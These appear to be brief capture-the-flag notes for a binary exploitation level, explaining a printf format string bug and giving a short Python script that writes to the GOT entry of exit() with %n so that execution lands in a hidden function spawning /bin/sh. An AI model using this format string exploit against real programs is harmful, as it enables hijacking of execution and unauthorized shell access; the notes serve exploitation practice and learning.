* In this level5 the main call a function n() which asks for input and pass it as a format parameter to printf . 
* info functions in gdb shows that there actualy a secret function o() which do a call to system("/bin/sh")

* to solve this level we have to overwrite GOT table of the exit() in n function, so we jump to o() instead of the real exit()

what is got ??
* 


import struct

exit_got = struct.pack("I", 0x8049838)
print exit_got + " %134513824p" + "%4$n"
